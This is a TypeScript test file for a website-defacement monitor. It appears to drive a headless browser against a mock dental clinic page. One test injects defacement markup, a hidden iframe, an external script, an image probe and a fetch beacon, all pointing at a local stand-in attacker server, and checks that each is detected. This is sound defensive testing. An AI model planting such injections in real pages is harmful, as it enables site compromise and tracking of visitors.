import test from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { BrowserUnavailableError, launchBrowser } from "./browser.js";
import { PageBaselineStore, snapshotPages } from "./page-baseline.js";
import type { PageFetcher } from "./page-digest.js";
import { PageWatcher } from "./page-watcher.js";
import { site as mkSite, tmpDir } from "./testkit.js";

/** A page we can change under the watcher's feet. */
function pageHtml(extra = "", clock = "12:00:00") {
  return `<!doctype html><html lang="en"><head><title>Acme Dental</title>
<style>body{font:16px sans-serif;margin:20px} #clock{background:#eee;padding:4px}</style></head><body>
<h1>Acme Dental Clinic</h1>
<p>Open Monday to Friday, 9am to 5pm</p>
<p>Book an appointment today</p>
<p>We offer cleaning, whitening and braces</p>
<p>Call us on 0917 000 0000</p>
<div id="clock">${clock}</div>
<script>alert("welcome")</script>
${extra}
</body></html>`;
}

async function listen(handler: http.RequestListener): Promise<{ server: http.Server; origin: string; host: string }> {
  const server = http.createServer(handler);
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const { port } = server.address() as AddressInfo;
  return { server, origin: `http://127.0.0.1:${port}`, host: `127.0.0.1:${port}` };
}

test("a real browser: snapshot, quiet when nothing changes, loud when the page is defaced, and boxed in", async (t) => {
  let fetcher: PageFetcher;
  try {
    fetcher = await launchBrowser();
  } catch (e) {
    if (e instanceof BrowserUnavailableError) return t.skip(e.message);
    throw e;
  }
  const { dir, cleanup } = await tmpDir();

  const probed: string[] = [];
  const attacker = await listen((req, res) => {
    probed.push(req.url ?? "");
    res.writeHead(200, { "content-type": "application/javascript" }).end("window.__pwned = 1");
  });

  let html = pageHtml();
  let tick = 0;
  const site = await listen((req, res) => {
    if (req.url?.startsWith("/app.js")) return void res.writeHead(200, { "content-type": "application/javascript" }).end("window.__ok = 1");
    html = html.replace(/<div id="clock">[^<]*/, `<div id="clock">12:00:${String(tick++ % 60).padStart(2, "0")}`);
    res.writeHead(200, { "content-type": "text/html" }).end(html);
  });

  try {
    const cfg = mkSite({
      platform: "static", transport: { type: "none" }, baseUrl: site.origin,
      pageRegions: [{ page: "/", selector: "#clock", reason: "live clock" }],
    });
    const store = new PageBaselineStore(path.join(dir, "data"));
    const [snap] = await snapshotPages(cfg, fetcher, store, { gapMs: 250 });
    assert.ok(snap.body.texts.includes("Acme Dental Clinic"));
    assert.ok(!snap.body.texts.some((x) => x.startsWith("12:00")), "the whitelisted clock is not even in the baseline");
    assert.equal(snap.body.status, 200);
    assert.ok(snap.body.pngSha256, "a screenshot was taken");
    assert.ok(snap.body.visualNoise < 0.01, `quiet page, noise ${snap.body.visualNoise}`);

    const watcher = new PageWatcher({ site: cfg, fetcher, baselines: new Map([["/", (await store.load(cfg.id, "/"))!]]) });
    const quiet = await watcher.runOnce();
    assert.deepEqual(quiet.events.map((e) => e.summary), [], "an alert() dialog and a ticking clock change nothing");
    assert.deepEqual(quiet.failed, []);

    html = pageHtml(`
<h1>Hacked by Test Crew</h1><p>Greetz to everyone</p>
<iframe src="${attacker.origin}/frame" style="display:none"></iframe>
<script src="${attacker.origin}/evil.js"></script>
<img src="${attacker.origin}/probe.png">
<script>fetch("${attacker.origin}/beacon")</script>`);
    const hit = await watcher.runOnce();
    const kinds = hit.events.map((e) => e.type).sort();
    assert.ok(kinds.includes("page.defacement_signal"), kinds.join());
    assert.ok(kinds.includes("page.iframe_injected"), kinds.join());
    assert.ok(kinds.includes("page.external_script_added"), kinds.join());
    assert.ok(kinds.includes("page.dom_changed"), kinds.join());
    const frame = hit.events.find((e) => e.type === "page.iframe_injected")!;
    assert.equal(frame.evidence.hidden, true, "display:none was seen as hidden by the browser");
    assert.equal(hit.events.find((e) => e.type === "page.defacement_signal")!.confidence, 0.97);

    assert.deepEqual(probed, [], "the page could not make the monitoring machine call another service, whatever the URL looked like");
    assert.equal((await watcher.runOnce()).events.length, 0, "and the same defacement is not reported twice");
  } finally {
    await fetcher.close();
    attacker.server.close();
    site.server.close();
    await cleanup();
  }
});

test("a page that cannot be loaded raises an error, never an event", async (t) => {
  let fetcher: PageFetcher;
  try {
    fetcher = await launchBrowser();
  } catch (e) {
    if (e instanceof BrowserUnavailableError) return t.skip(e.message);
    throw e;
  }
  const refused = await listen(() => undefined);
  const port = refused.host.split(":")[1];
  refused.server.close(); // nothing listens on this port any more
  try {
    await assert.rejects(() => fetcher.fetch(`http://127.0.0.1:${port}/`, { hideSelectors: [], screenshot: false }), /ERR_CONNECTION_REFUSED|net::/);
  } finally {
    await fetcher.close();
  }
});

test("a server that accepts the connection and never answers is abandoned on the time limit", async (t) => {
  let fetcher: PageFetcher;
  try {
    fetcher = await launchBrowser({ navTimeoutMs: 1500, totalTimeoutMs: 6000 });
  } catch (e) {
    if (e instanceof BrowserUnavailableError) return t.skip(e.message);
    throw e;
  }
  const silent = await listen(() => undefined); // takes the request, never replies
  const started = Date.now();
  try {
    await assert.rejects(() => fetcher.fetch(`${silent.origin}/`, { hideSelectors: [], screenshot: false }), /Timeout|timed out/i);
    assert.ok(Date.now() - started < 10_000, `gave up in ${Date.now() - started} ms`);
  } finally {
    await fetcher.close();
    silent.server.closeAllConnections?.();
    silent.server.close();
  }
});
